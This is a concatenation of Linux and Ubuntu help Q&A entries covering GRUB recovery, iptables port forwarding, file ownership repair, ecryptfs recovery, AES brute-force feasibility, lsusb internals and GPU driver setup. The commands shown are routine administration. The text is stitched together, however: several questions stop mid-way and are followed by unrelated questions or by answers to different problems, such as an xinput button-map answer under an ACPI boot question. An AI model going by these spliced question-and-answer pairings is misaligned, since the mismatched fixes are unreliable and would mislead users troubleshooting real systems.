msdos partition tables.\n\nGRUB Legacy, traditionally known as GRUB, covers versions 0.9x and earlier. GRUB Legacy works with msdos partition tables only. \n\nGRUB 2 is used as the default boot loader in the following GNU/Linux distributions:\nCentOS 7 and higher\n\nDebian 6 (Squeeze) and higher\n\nFedora 16 (Verne) and higher\n\nopenSUSE 12.2 and higher\n\nUbuntu 9.10 (Karmic Koala) and higher \n\nIf you are unsure whether your computer uses GRUB 2 or GRUB Legacy, you might try searching for the answer on the Internet.\nRestoring GRUB 2 Boot Loader\nUse the following steps to restore the GRUB 2 boot loader:\nBoot from Live media such as GParted Live or your GNU/Linux distribution image. Open a terminal window.\n\nDetermine which partition contains the / file system for your GNU/Linux distribution.\n\nUse GParted to list the partitions on your disk device. Look for a partition that contains your GNU/Linux / file system. This Linux partition will likely use a file system such as ext2, ext3, ext4, or btrfs.\n\nNote\nIf the / partition is on LVM then the Logical Volume Manager must be active. LVM can be started with the command:\nvgchange -a y\nWith LVM, the equivalent of a disk partition is a Logical Volume. Logical Volumes can be listed with the command:\nlvscan\n Create a mount point directory by entering (as root):\n\n# mkdir /tmp/mydir\n\nMount the / partition on the mount point directory. For example assume the / file system is contained in the /dev/sda5 partition. Enter (as root):\n\n# mount /dev/sda5 /tmp/mydir\n\nIf you have a separate /boot partition, for example at /dev/sda3, then an extra step is required. Mount the /boot partition at /tmp/mydir/boot by entering (as root):\n\n# mount /dev/sda3 /tmp/mydir/boot\n\nNote\n\nIf you do not know whether you have a separate boot partition then you probably do not and can ignore this step.\n\nPrepare to change the root environment by entering (as root):\n\n# mount --bind /dev /tmp/mydir/dev\n\n# mount --bind /proc /tmp/mydir/proc\n\n# mount --bind /sys /tmp/mydir/sys\n\nChange the root environment by entering (as root):\n\n# chroot /tmp/mydir\n\nReinstall GRUB 2 on the boot device. Note that the device name is used and not the partition name. For example, if the / partition is /dev/sda5 then the device is /dev/sda.\n\nFor Debian, Ubuntu, and other offshoot GNU/Linux distributions, enter the command (as root):\n\n# grub-install /dev/sda\n\nFor CentOS, Fedora, openSUSE and other offshoot GNU/Linux distributions, enter the command (as root):\n\n# grub2-install /dev/sda\n\nExit the chroot environment by entering (as root):\n\n# exit\n\nReboot your computer. \n\nRestoring GRUB Legacy Boot Loader\nUse the following steps to restore the GRUB Legacy boot loader:\nBoot from Live media such as your GNU/Linux distribution image. Open a terminal window.\nNote\n\nThe Live media must contain the GRUB Legacy boot loader. If your GNU/Linux distribution uses GRUB Legacy, then the distribution Live media will also contain GRUB Legacy.\n\nStart the grub application from the command line (as root).\n\n# grub\n\nFind where grub stage1 is located by using one of the following:\n\nIf the /boot folder is stored in the / partition, use the command:\n\ngrub> find /boot/grub/stage1\n\nIf the /boot folder is stored in a partition different than the / partition, use the command:\n\ngrub> find /grub/stage1\n\nThe output from the find command might look like the following:\n\n (hd0,0)\n\nIf more than one line is listed in the command output, you will need to decide which device you use for grub.\n\nSet the grub root device by specifying the device returned by the find command.\n\ngrub> root (hd0,0)\n\nReinstall grub by specifying the device returned by the find command.\n\ngrub> setup (hd0,0)\n\nExit grub.\n\ngrub> quit\n\nReboot your computer. \n\n*************************************************8\n***strong text***RTFM!!\n", "Q: FTP Users Authentication error: 530 and File Formatting I have a script I am trying to run as a cron job.

Ultimately I would like to have launcher icons in the upper right of the menu bar (next to wifi, time, etc.). Thanks for the help!\n\nA: No, on a standard Ubuntu install, it is not possible to do this.\nThere is the classicmenu-indicator which you could install and run, to provide the traditional menu as an indicator in the upper right. Due to the nature of the menu panel though, traditional launchers as would have existed on the GNOME 2.x panel would not work, as they would have to open a menu, where you could then launch the thing from, and that kind of defeats the purpose.\n\nA: This is not possible with Ubuntu 14.04 (with Unity), but you might want to try a \"dock\" software.\n", "Q: ACPI PCC probe failed during installation of ubuntu 14.04 Lts I'm try to install ubuntu 14.04 Lts distribution in a machine Dell precision T1700 with Windows 8.1..The  LiveCD shows correctly the options of grub menu but, when I selected any option for installation, the error \"ACPI PCC probe failed\" appers and the screen keeps black finishing the process.

For example,\nxinput --set-button-map 12 0 0 0 4 5 6 7 8 9 10 11 12\n\ndisables the first three buttons in my touchpad, that is, left, center and right.\n", "Q: Port forwarding Openstack landscape I have install MAAS+OpenStack on My servers.\nAt the end of install OpenStack Autopilot, I got adress to interface of Openstack Landscape:  http://10.1.1.102/account/standalone/openstack \nHow can I do port forwarding to see that from other LAN?\nIP of main server with IP on word is (for example): 155.158.102.80 where is MAAS page on http://155.158.102.80/MAAS/\nI have created something like that but I don't now is it good:\niptables -A PREROUTING -t nat -p tcp -d 155.158.102.80 --dport 33333  -j DNAT -to 10.1.1.102:80\nThanks for help!\n\nA: Openstack Landsacpe is in https connection so port forwarding for port 80 don't work.\nI added this two iptables instructions and it works! ;)\nsudo iptables -A PREROUTING -t nat -p tcp -d 155.158.102.80 --dport 443 -j DNAT --to 10.1.1.102:443\nand\nsudo iptables -A FORWARD -p tcp -d 10.1.1.102--dport 443 -j ACCEPT\nMAAS is working on http (80) so We can forward port 443 without problems.\nRegards.\n", "Q: How to search through all keyboard shortcuts that use a certain key? I sometimes set keyboard shortcuts, but as there are so many keyboard shortcuts set on my system, it is hard to know what other keyboard shortcuts you might set off when setting and using a new one, so it would be really useful if there was a way (preferably through Terminal) in order to view all the keyboard shortcuts on the system that have a certain key, a certain order of certain keys, or a certain set of keys (but having it not matter which order they have in, just searching through shortcuts with those keys in them).\nThere will either be a utility already in existence which will allow me to do this, if so, please recommend it, however, if not, then a script or command would also be acceptable and possibly more likely as I haven't seen anything like this around.

The wipe also deleted default windows bootx64.efi.  Right now my fat32 partition flagged as boot is mounted on /boot/efi. \nGoing in /boot/efi/EFI, the only folder, naturally, is ubuntu with grubx64.efi, shimx64.efi etc.\nWhen I boot, the BIOS OS Selector naturally doesn't recognize any OS to boot (it only recognizes bootx64.efi right?). This answer explains how to set grub as the default bootloader over default windows boot. Should I do something similar and create a Boot folder inside /boot/efi/EFI with grubx64.efi copied in it, renamed as bootx64.efi? The above mentioned answer refers to the path: /EFI/BOOT/BOOTX64.EFI, but generally the bootloader should be in the path where boot partition is mounted, so in my case path /boot/efi/EFI is correct?\nEDIT: Using HP Z-book 15. I currently have to manually select efi file when booting. BIOS allows \"boot from efi file\". I then select /EFI/ubuntu/grubx64.efi and boot starts.\n\nA: Have you tried running boot repair CD? It reinstall GRUB and configures it. You can find a live image here : http://sourceforge.net/projects/boot-repair-cd/\n\nA: At first I just made a dirBoot in /boot/efi/EFI where I copied grubx64.efi renamed as bootx64.efi. Sometimes the grub menu showed up, other times the boot went straight into ubuntu, without letting me choose and finally sometimes the purple screen stayed on forever.\nI then tried using shim so I copied shimx64.efi into Boot, named grub back to what it was and named shimx64.efi to bootx64.efi. This time it always booted straight into ubuntu.\nI then used boot repair recommended repair and it created a Windows/Boot dir in /boot/efi/EFI with files bootx64.efi, bootmgfw.efi and their efi.grb namesakes.\nNow grub menu shows up every time, allowing me to choose between ubuntu, advanced boot etc. \nOnly problem is that the black screen code shown after ubuntu boots and before ubuntu logo screen shows up is rendered as a bunch of pixels shaped like an upside down sqaure \"U\". In any case, grub now works.\nLinks: Boot repair page, Difference between shim and grub.\nEDIT: If boot repair page returns internal server error, this is how boot repair can be installed:\nsudo add-apt-repository -y ppa:yannubuntu/boot-repair\nsudo apt-get update\nsudo apt-get install -y boot-repair && boot-repair\n\nBoot repair window should show up after install.\n", "Q: How to boot on Mac OS X? Emergency I installed Ubuntu 14.04 on a partition of 50 GB.My main OS is El Capitan.I don't have rEFInd installed and now i cannot boot on my main partition even while pressing option key.I can also unmount or eject my Macintosh HD but i don't know if that's safe.Any help anyone?\nThanks in advance.\n\nA: I have three suggestions:\n\n\n*\n\n*In Ubuntu, type sudo update-grub. That should cause Ubuntu to update the GRUB menu. With any luck, it will detect your OS X installation and create a boot entry for it. This might not work, though; the detection code should be the same as the code that ran during installation, so if it failed then, it will probably fail now. It's worth a try, though.\n\n*Use my rEFInd boot manager on CD-R or USB flash drive (download links are provided for both) to boot. This should give you the option of booting Ubuntu or OS X. Once you've booted OS X, you should be able to use its startup disk manager to reset OS X as the default boot option. The trouble with this approach is that you'll then be able to boot OS X but not Ubuntu. This might be acceptable as a short-term solution as you work out something longer-term, though, or if you've decided you don't want to boot Ubuntu at all.\n\n*Install rEFInd to your hard disk. You should be able to do this in Ubuntu; however, I generally advise installing from OS X on Macs. Thus, you might want to use rEFInd on a USB flash drive to boot to OS X so as to install rEFInd. One complication, though, is that El Capitan's System Integrity Protection (SIP) feature will prevent installation unless it's disabled first. See here for details on how to work around this problem. (One possible solution is installing in Ubuntu, which would obviously be the easiest solution in your situation.)\n\n", "Q: Ubuntu 14.04 Adding #10 Envelope to Samsung M2070 Running Ubuntu 14.04 on my laptop, got Samsung M2070 added as my printer.

It works fine, but my hard drive does not seem to work. I tried another hard drive (from my alternate laptop) and it worked fine, but this hard drive is recognized by Ubuntu, but cannot be read or written to by Ubuntu.\nI tried to follow the other question mentioned earlier (although most of the answers were 'replace your hard drive') and ran the SMART tool. I was able to run it without any errors, but then it says that the \"Self-Test Failed\". Does that refer to not being able to successfully run the check, or does it mean that the hard drive did not pass it?\nAnyways, here are my specs:\n\n\n*\n\n*AMD A6-6400K processor\n\n*8GB of RAM\n\n*1 TB WD Blue desktop hard drive\n\n*FM2A58M-VG3+ R2.0 ASRock motherboard\n\n\nI have already done the following:\n\n\n*\n\n*Tried using multiple disk checks\n\n*Moving the SATA cables around\n\n\nJust to be clear, because I can't install anything on the disk, I cannot install any third-party programs. Thank you for your help!\n\nA: Before you give up on your hard drive, always try re-seating the data cables and try different cables and motherboard ports to see if it is just a cabling issue.  However, a SMART test is usually something that the drive performs itself, so if it fails a \"self check\" that is initiated by the drive itself, it is likely just a bad drive.  Checking cables is so cheap and easy it often pays to check those.\nIf you have another computer that you can plug the drive into you can rule out your motherboard BIOS or power supply causing the problem.  If possible, I would not use the same cable if you move to another PC to test it.  That way you eliminate that as a possible suspect.  If your drive fails the same way in another machine, you definitely have a bad drive.\nIf the drive is an SSD, make sure you check for firmware updates from the manufacturer as well.  I doubt this is the cause of your issue though, since SSDs are usually tested and work out of the box in most systems from the factory.  Firmware updates are usually to solve efficiency problems or bugs.\nGood luck!\n", "Q: System Tray Icons My system tray icons appear to be little square boxes instead of icons in login screen.

However, When I try to log in with my username and password the external monitor shuts off and it does not appear to have logged in succesfully when I use CTRL+F7 to try again.     -Thanks.\n\nA: First, login to your guest account and use the su command to switch users in the terminal. \nFor example, if your username is colonelclank you should run: \nsu colonelclank\n\nYour username should now appear at the command prompt in the terminal. Next, run the following commands to change to your user's home directory and to fix any file permission issues that may be preventing you from logging in.  \ncd; sudo chown -R $USER:$USER ~/ \n\nNow, run the following command to display your xsession errors (note you have to be logged in the terminal with your username as this will not work in the guest home directory): \ncd; cat .xsession-errors \n\nThere may be some useful info here, however, the problem may already be fixed so log out and try to log back in as your user to see if the problem still persists. \n\nPART TWO\nIf you still need a script to listen for and to automatically connect to your external monitor when plugged in, you can run the following commands to install a script to do this:\nsudo apt-get update\nsudo apt-get install git consolekit\ngit clone https://github.com/codingtony/udev-monitor-hotplug.git\ncd udev-mon*\nsudo cp usr/local/bin/monitor-hotplug.sh /usr/local/bin/\nsudo cp etc/udev/rules.d/99-monitor-hotplug.rules /etc/udev/rules.d/\nsudo service udev restart\n\nClick here for more info. \n\nA: First, thanks to mchid.

But while on holidays, I had copied some family pics on the hard drive I moved there to watch on TV though HDMI, and my camera has since been stolen. so I want to try save the family pics \\ vids which fortunately are on the Ubuntu drive... which I can't access.\nBut there is more...

But no I don't have permission to access the drive. No request for password. \nHelp with instructions as I have limited (very Limited) Linux knowledge.\nJinn\n\nA: From Live Cd/DVD\nFirst ensure the partition containing your encrypted home directory is mounted.  You can easily mount it by clicking It in the file manager; you will see an eject (unmount) icon, indicating the partition is mounted.\nNow Open a Terminal (Ctl  Alt T)\nThen look for the drive:\n sudo ecryptfs-recover-private\n\nThis command will offer to recover an encrypted directory if it locates one.\nAssuming the command found a wrapped passphrase file on your system, it will prompt you for your login passphrase. If it doesn’t find this file, you’ll need the mount passphrase from the ecryptfs-unwrap-passphrase command – hopefully you have a copy of this. If you don’t, you can’t recover your files.\nIf you have found the drive and entered the correct password\nThe command will mount the encrypted directory in your /tmp directory.(your temporary files) \nYou can access this directory to view the decrypted versions of your files. However, you may not have read access to this directory as the live CD user.\nTo access the directory with a graphical file browser, run Nautilus as root. Press Alt+F2, type gksu nautilus and press Enter.\nYou will now be able to access your files from the Nautilus window running as root. From here, you can easily copy the files to an external hard drive or another location!!\nReferences -UbuntuGeek \n", "Q: How do I change Lubuntu's logout image?

If the system lets you remove it then remove it. You know you don't need it.

Why can I still browse the internet? I have been trying to figure out why I cannot SSH to my raspberry pi from my laptop outside the pi's network. I port scanned and found only port 22 open. I got stuck with that and still do not know why I can't.\nI saw that port 80 and 443 (http and https) are closed.\nAnd I wondered why am I still able to browse internet webpages?\n\nA: The ports are closed for incoming connections only. In fact, when you browse a website, you are typically not using port 80 (or 443) on your machine at all, but using some higer-numbered port to connect t port 80 on the machine serving the website you are visiting.

There could be 3 possible reasons for the lack of AMD-V support:\n\n\n*\n\n*You have it turned off in the Virtual Machine settings (in VirtualBox this setting is under System --> Acceleration --> Hardware Virtualization). See screenshot below for a screen grab of the location...\n\n\n\n\n\n*The setting is turned off in your computer's BIOS. To rectify this you will need to access your BIOS settings and turn it on. Carefully :).\n\n*If the above settings are not an issue and you are running a Windows host the problem can sometimes be interference from another hypervisor (like Microsoft’s Hyper-V) using AMD-V.

If your display name is John Smith, the user name is probably johnsmith), then enter your password. Note that the password gets not echoed while you type it, not even with asterisks.\nAfter the login, you have a terminal. To install the two default terminal emulators again, run the following command (assuming you are an admin user with sudo privileges):\nsudo apt-get install gnome-terminal xterm\n\nYou will be prompted for your password again, then the installation should start. \nAfter it finished, you can log out of the shell session using the command exit or the shortcut Ctrl+D. \nOnce you're logged out, leave the TTY1 (or 2-6) and go back to TTY7, where the GUI desktop is. You get there by simply pressing Ctrl+Alt+F7.\nNow you should be able to enjoy a working terminal emulator again!\n\nA: Perhaps the easiest way to test whether a Terminal application has been installed on your system (and it would be unusual if this was not the case) is to use the following keyboard command: Ctrl+Alt+ T. \nReference:\n\n\n*\n\n*Starting a Terminal\n\nA: If your Ubuntu 14.10 desktop is installed by default settings, then the desktop environment is most likely to be Unity instead of GNOME.\nIn Ubuntu Unity, command line tools like Terminal and XTerm are pre-installed.

I create a file using:\ngpg --cipher-algo AES256 --output file -c original_file\n\nThe system ask me for a paraphrase and I typed in.\nSo the question is: Is there any way to decrypt this file without knowing the paraphrase?\n\nA: Currently AES256 takes too long to brute force. From the link: \n\nIf you assume:\n\nEvery person on the planet owns 10 computers.\nThere are 7 billion people on the planet.\nEach of these computers can test 1 billion key combinations per second.\nOn average, you can crack the key after testing 50% of the possibilities.\n\n\nThen the earth's population can crack one encryption key in 77,000,000,000,000,000,000,000,000 years!\n\nSo for now: no. In 10 years computers might be able to drop this down to a fraction but then we will have something like AES512 (2 weeks ago they discovered a new prime number and those can be useful for new encryption).\nBut that is assuming it has no backdoors and someone does not have other methods of getting the passphrase (social engineering).\n\nA: The algorithm is used by the US government to encrypt their top secret documents and it is called calculation save. \nBut nothing is impossible. If you have a really fast computer and a lot of time (probably a few hundred or thousand years), you can crack any password.\nSo, to answer your question: Yes, there is a way to decrypt your file without knowing the passphrase, but that would be way to expensive for anybody or any government. And possibly not in your lifetime.\n\nA: There is no way to decrypt AES-encrypted contents unless\n\n\n*\n\n*You invest a vast number of CPU hours by brute forcing it. Vast means something out of range for even powerful attackers for the next few dozen years.\n\n*Somebody finds problems with the AES algorithm, rendering the mathematical problem much easier to solve than it is expected (making brute force attacks feasible).\n\n*Quantum computing is bringing massive speedups in brute-forcing AES, but this is not to be expected within the next few years and AES 256 is still considered safe enough even if this would happen  (some consider AES 128 to be too weak for post-quantum-cryptography, though).\n\n*The string-to-key function used in GnuPG to derive the session key from a passphrase proves to be weak, which is also rather unlikely.\n\n\nTo wrap up: the data encrypted with AES 256 is safe, and probably will be safe for a few dozen years. Theoretically it would be possible to run brute-force attacks, but these are so expensive they cannot be performed.\n", "Q: Is OpenCL yet supported in Ubuntu with open source drivers? I am running Ubuntu 15.10. I have i7-4770 CPU and Radeon HD 8490, both should have a GPU. I would like to try OpenCL programming, but I think I am missing some needed files like cl.h. Can I just install some Ubuntu repository packages to get OpenCL working with open source drivers?\n\nA: To get it working on Ubuntu 16.04 I had to:\n\n\n*\n\n*Download the AMD app sdk: http://developer.amd.com/sdks/AMDAPPSDK/Pages/default.aspx\n\n*sudo apt-get install opencl-headers\n\n*sudo apt-get install mesa-opencl-icd\nWhen compiling your program all the relevant files can be found in /opt/AMDAPPSDK-3.0 (given that you don't change the default location and with 3.0 the version that I installed; this might be different depending on the version). Don't forget to pass the include and lib directories as -L and -I flags!\nOne specific problem that I also had was that the /opt/AMDAPPSDK-3.0/lib/x86_64/libOpenCL.so was actually a soft link to somewhere. But somehow the soft link broke (you can check this by right clicking and selecting properties), so it was impossible for me to compile (kept getting \"lOpenCL cannot be found\" errors even though I included the relevant directories as -L and -I flags). So I had to delete libOpenCL.so in the x86_64 folder and replaced it with a new symlink to the libOpenCL.so in the sdk folder.

Or 15.10?\n\nA: Google Chrome is not Ubuntu.\nYour 14.04 Ubuntu release and all software from the official repositories will be fully supported until April 2019.\nThe problem is that Google Chrome is not part of the official repositories and not maintained by Canonical or the Ubuntu community. Therefore we are not responsible for updates, but Google. And they decided to stop supporting all 32 bit versions of Chrome.\nYou should switch to another browser and leave Google Chrome. Alternatives are for example\n\n\n*\n\n*Firefox\n\n*Chromium (an open source variant of Chrome)\n\n*Opera\n\n*Epiphany\n\n*...\n\n\nThere is absolutely no need to switch your operating system. You could update to 15.10 (supported until July 2016 only), or simply wait for the next LTS (Long Term Support = 5 years) release 16.04 which comes out in April 2016, if you want.

I am a Ubuntu user, recently I switched from Ubuntu 14.04(Unity one) to Ubuntu 14.04 (GNOME one).

I cannot even move one folder into another. There is an error saying you cannot handle this folder because you don't have permissions to read it.\nI followed some links and tried to change permissions by right clicking on the folders but still I don't get permissions. If I perform operations in terminal using 'sudo' there are no problems but why cannot I do things through GUI? How to get these permissions? These problems weren't there in my previous Ubuntu, I was the owner of all the files and folder and could do anything from GUI only. \nI am facing one more problem. I am an android studio user and there are some projects in my home folder, some of the project files are shown with a lock icon on them and only root can access them. So, when I run studio it cannot access those files and shows error. \nMoreover I have installed android studio, made a project and saved it. I created a desktop entry for the studio.sh file so that I don't have to run the studio.sh file from terminal again and again. When I open android studio now whether through terminal or even the launcher I am greeted with fresh setup again. I run the studio.sh file using 'sudo' only. I feel like both the issues are there because I don't have required permissions. Any help is appreciated. \n\nA: To fix it and conquer back all files in your home directory, run\nsudo chown -R $USER: ~\n\nAnd for the future:\nDo not run GUI applications with sudo, but use for example gksu or at least sudo -i or sudo -H to prevent it from taking ownership of files in your home directory.\n\nA: Simpliest way:\nYou need to change the owner of those files:\nsudo chown `whoami` path/to/file\n\nMakes your current user (output of the command whoami) to the owner of the files.\nsudo chown -cR username:groupname path/to/folder\n\nMakes user username of group groupname owner of folder and all subfolders and files. The name of the group is probably the same as your username. Listing every group a user is in can be done via:\ngroups username\n\n", "Q: How to reinstall Ubuntu in dual boot with Windows 10?

The biggest disadvantage of this approach is that you would have to resort to things like symbolic links or bind mounts if you needed extra disk space in more than 1 area.\nor,\n2) Create /dev/xvda3 as a partition using the rest of the disk, make it a LVM physical volume, put that into a volume group, then create logical volumes out of that volume, mounting them as required. This approach lets you have as many different filesystems as you need (within reason), but the initial setup is more complex. On the flip side, these filesystems can be extended as required with lvextend (and with the -r option, the filesystem is automatically increased to match the volume size).\n", "Q: Error while installing unity-tweak-tool on Ubuntu 14.04 sudo apt-get install unity-tweak-tool \n\nresults in\nReading package lists...

That leaves the official drivers from NVIDIA. I tried installing them from the \"Additional drivers\" utility in Ubuntu. Installation seems to finish without errors. \nI then reboot, get a quick Ubuntu splash screen (little progress bar of dots on a purple background), and then it drops to a completely black screen with a little blinking prompt line in the upper left. It never seems to move on from that, so the only option is to reboot. This will then lead to the same place, unless I go to recovery mode and purge everything NVIDIA.\n\n\n*\n\n*This was all done on a clean install of 14.04 and 15.10 (I tried both).\n\n*Monitor is connected with DisplayPort.\n\n\nSo I am out of ideas, and am hoping that someone here might help.\nIf someone knows a way of setting up multi-monitor with Nouveau, that could also be an alternative.\nThings I have tried:\n\n\n*\n\n*Boot flag \"nomodeset\" (in fact seens to be necessary to boot at all with 15.10)\n\n*Boot flag \"acpi=off\" (This leads to a stop at the purple screen, instead of the black screen)\n\n*http://ubuntuforums.org/showthread.php?t=2263316\nList of relevant hardware:\n\n\n*\n\n*CPU: Intel i7 5820K (Haswell)\n\n*Motherboard: ASUS X99-A\n\n*RAM: DDR4 2133MHz\n\n*GPU: MSI GeForce GTX960 2GB\nErrors I have seen here and there at boot/install.

(Yes there were many attempts...)\nThis is what I did:\n\n\n*\n\n*Connect a monitor to the DVI-port.\n\n*Fresh install of Ubuntu 15.10\n\n*Set boot option \"nomodeset\" using the program boot-repair.\n\n*Set blacklist.conf according to here: http://ubuntuforums.org/showthread.php?t=2263316 This included fixing the typo \"nouveua\".\nblacklist vga16fb\nblacklist nouveau\nblacklist rivafb\nblacklist nvidiafb\nblacklist rivatv\nblacklist lbm-nouveau\noptions nouveau modeset=0\nalias nouveau off\nalias lbm-nouveau off \n\n\n*Switch to non-graphical terminal: ctrl+alt+F1\n\n*Kill GUI: sudo service lightdm stop\n\n*sudo apt-get install nvidia-352\n\n*nvidia-xconfig\n\n*Start GUI again: sudo service lightdm start\nAnd then it worked! \nI think having the monitor connected to the DVI-port while installing the driver is important. My previous attempts used the DP-port while installing the driver. Switching to DVI after driver install did not help.\nI connected two additional monitors to DP-ports, and my desktop was extended flawlessly. So it's not that DP doesn't work, but it may be a requirement of at least one DVI monitor to get it set up correctly.\nNote that I myself do not have a full understanding of what I did with blacklist.conf and the boot option \"nomodeset\". Neither do I know if it was crucial to do the install in a ctrl+alt+F1 with a killed GUI.\nOne or many of these things may have been unnecessary. Perhaps others will enlighten us. \n\nA: Generally you should use the NVIDIA drivers from the Ubuntu repositories.

Where are these files located in ubuntu 14.04.\n\nA: You too have homework, like in “what does ifconfig and eth0 do” ? :-D\nThe TCP/IP stack is implemented in the kernel (Linux is a monolithic kernel). It's implemented as a separate module only with microkernels. So the files you are looking for, are most likely source files. On the other hand, following the UNIX spirit or “(nearly) everything is a file”, you may look for network items interface exposed as files or file handles (like sockets are). Both are presented here: The TCP/IP Stack in the Linux Kernel.\n", "Q: How do I terminate a 'Ping' without closing the command terminal window? When I use the 'Ping' command in a terminal window, how do I terminate the ping?  I have pinged my router (192.168.1.1) and the results have displayed in the terminal window, but the program keeps running with no indication as to how to terminate.\nI can end the command by closing the command terminal window, but I would rather keep it open so I can compare pings with different addresses.\nUbuntu 14.04 LTS\n\nA: You can use Ctrl+C to send a SIGINT (interrupt signal) to the ping process - see Unix signals\n\nA: Either give ping a count with the -c option :\nping -c 4 google.com\n\nOr use the keys Ctrl+C to terminate the command.\n\nA: There are three options:\n\n\n*\n\n*Manually interrupt the ping command using Ctrl+C, as described in @steeldriver's answer.\n\n*Use ping's \"count\" option (-c COUNT) to send exactly COUNT pings and then terminate automatically, as described in @bodhi.zazen's answer.\n\n*Use ping's \"deadline\" option (-w DEADLINE) to run for exactly DEADLINE seconds and then terminate automatically.\n\nOf course you can combine the three options. If you pass both a \"count\" and a \"deadline\" option, ping will terminate as soon as the first event occurs. And Ctrl+C works always anyway.\nHere's an example with a \"count\" of maximal 10 pings and a \"deadline\" of 5 seconds, but which got terminated manually using Ctrl+C after 3 pings (^C):\n$ ping -c 10 -w 5 askubuntu.com\nPING askubuntu.com (104.16.110.188) 56(84) bytes of data.\n64 bytes from 104.16.110.188: icmp_seq=1 ttl=56 time=54.6 ms\n64 bytes from 104.16.110.188: icmp_seq=2 ttl=56 time=52.5 ms\n64 bytes from 104.16.110.188: icmp_seq=3 ttl=56 time=54.0 ms\n^C\n--- askubuntu.com ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2001ms\nrtt min/avg/max/mdev = 52.582/53.733/54.611/0.850 ms\n\n\nA: You should try  Ctrl + C to stop the processus.\n\nA: You can try ctrl + c to send an interrupt signal, it will terminate the program without closing terminal\n", "Q: Any Ubuntu or 3rd party extensions for touchscreen? My laptop has a touchscreen.  Recently I installed a partition Windows 10 and Ubuntu 15.10  -- I noticed touch behaves differently between the two operating systems.\nTouchscreen on my windows machine is very sensitive.  I like being able to use my two fingers to expand sections of text or to scroll quickly down a page.  The Ubuntu touch screen does not do this.\nUbuntu - being open source - can't always be current (but usually catches up).  Are there any extensions I can download to enable these features?\n\nA: Touchscreen is already supported by Ubuntu. The Multitouch Wiki page lists the supported gestures in Unity.\nThe problem you are describing is that the applications you are using don't support touch screens.\nFor example, other than the available Unity gestures, Google Chrome has support for touch screens. For instance, you can pinch to zoom and scroll through the page with your fingers (you can find the touch settings if you go to chrome://flags/#touch-events in Chrome), while Firefox doesn't support touch screens on Linux yet.\nAnother example is the image viewer which also has touch support. You can pinch to zoom, swipe left or right to go the next or previous image (or scroll through the image when it is not set).\n", "Q: Accessing 1D Touch music-streaming platform with Rhythmbox I got a account on 1D Touch, a streaming platform, and it will be nice if I could have an access with Rhythmbox (instead of my web browser).\nThe platform is sending mp3, readable with an API using oauth (nothing else...).\nCan someone tell me, please, how to listen to my favorite platform using Rhythmbox ?\n\nA: Yes it is possible to listen to music from 1D Touch ... there is a big but though.\nRhythmbox has the ability to add extra software to it called \"plugins\".  These can be written in Python or C/C++.\nPlugins give extra capabilities that Rhythmbox lacks natively.\nYou'll need to create a plugin yourself - or encourage some kindly soul to create one for you.\nThere is API documentation for 1D here to help.\nGiven the nature of the plugin, I would suggest looking at the SoundCloud plugin available in Rhythmbox 3.2 and later.

Also some of the build-scripts for Android only ran with LANG=C properly or compiled only with this environment variable set this way.\nSo this could also help troubleshooting as the bug might not even occur with this setting.\n\nA: If you're troubleshooting, you'll likely post your results in some forum, or here, sooner or later.\nWhen that happens, it's much more simpler for other users to understand your logs and output, if they're not internationalised.\nThat's to say, if you're using French or Chinese or Hindi or whatever as your system language, the output is likely to use terms in that language, and that makes it all the more harder to understand what's going on.\nThe C locale forces default output (which is typically ASCII-only English).\nIt's best to start a troubleshooting session with:\nexport LC_ALL=C\n\nInstead of setting specific locale variables, or setting it just for a specific command.\n\nA: LANG=C will make your terminal output fall-back to the default locale. As this guide suggests you sending your output to Launchpad for support, they are having you do this so that, when you paste it in, others will be able to read it no matter what language you usually use.\n", "Q: xinput settings reset in just few seconds I want to make my touchpad natural scroll, so I reversed prop of \"Synaptics Scrolling Distance\" by add '-'.

I want to the file from which the command \nlsusb -t\n\nretrieves the data. I am curious to see where this is stored.\n \nand can anyone also tell that what can do with device id that displays in fdisk -l?\n\nA: lsusb reads its data from the kernel provided virtual sys Filesystem mounted in /sys;  specifically from the location of relevant directories for USB devices. These devices are connected to different PCI buses and are (mostly) detected by udevd.\nFor example, in my computer here is one example of the localtion of a USB device connected to a particular PCI bus:\n/sys/devices/pci0000:00/0000:00:1d.0/usb4/4-1/\n\nThe contents of the directory:\n% print -l *\n4-1:1.0\nauthorized\navoid_reset_quirk\nbcdDevice\nbConfigurationValue\nbDeviceClass\nbDeviceProtocol\nbDeviceSubClass\nbmAttributes\nbMaxPacketSize0\nbMaxPower\nbNumConfigurations\nbNumInterfaces\nbusnum\nconfiguration\ndescriptors\ndev\ndevnum\ndevpath\ndriver\nep_00\nidProduct\nidVendor\nltm_capable\nmaxchild\nport\npower\nquirks\nremovable\nremove\nspeed\nsubsystem\nuevent\nurbnum\nversion\n\nlsusb just reads from relevant file(s) of this directory.\n\nA: lsusb uses libudev to fetch the list of devices you see.

If you want some fun:\nldd `which lsusb`\nstrace lsusb -t\nltrace -l \"libudev*\" lsusb -t\n\nWell, I would suggest to read at least the long description (if not the whole manual) of each command using man or info.\n\nA: Kernel has drivers for the devices and kernel adds them. Devices report their capabilties to the driver or to the BIOS. Some of them are reported by BIOS. I know that because I had a BIOS with bug and it was reporting fans, which were not present. When processor got hot, the kernel driver tried to switch on inexistent fans. Finally I solved the problem by compiling the kernel without support for fans.\nTake a look at /sys/devices. You will find your devices there. You can find lots of information about the devices in directories and files. Kernel creates them dynamically when devices are dis/connected.\n\nA: After a quick strace, I found that lsusb keeps a list of VID/PIDs that relate to product names in /var/lib/usbutils/usb.ids\n", "Q: How do I make a directory?

Take care with this as sometimes this may allow shell access (for example running vim as root with sudo -> vim will then allow shell access).\n\n\nFor details see https://www.sudo.ws/man/sudoers.man.html, there are entire sections on how to configure sudo to allow access to a limited set of commands, by user, by group, and by alias.\n\n\n*You can limit root with apparmor.\n\n\nSee discussions on Simple & easy way to jail users and http://blog.bodhizazen.com/linux/shared-ssh-sessions-update-for-jaunty-ubuntu-904/\nIf you have a specific problem with either method, revise your question or better ask a more specific question.\nOn other systems you can limit root with similar tools such as selinux - see http://www.engardelinux.org/ Engarde Linux restricts root with selinux ;)\n\n\n*You can restrict access to data via encryption.\n\n\nA: Only users inside of the sudo group can use it.\nIf you don't want users to be able to use root commands, you can delete them from the group sudo with deluser user sudo\n", "Q: Ubuntu phone podcasts Will I be able to receive my favourite podcasts with the aquarius E4.5 Ubuntu edition phone?\n\nA: Yes, there are podcast apps (e.g. Podbird) available in the Ubuntu Store, that you can download and use on the BQ Aquaris 4.5 Ubuntu Edition.\nI-tunes links don't seem to work directly on podbird. However, you can use feedflipper to convert them.

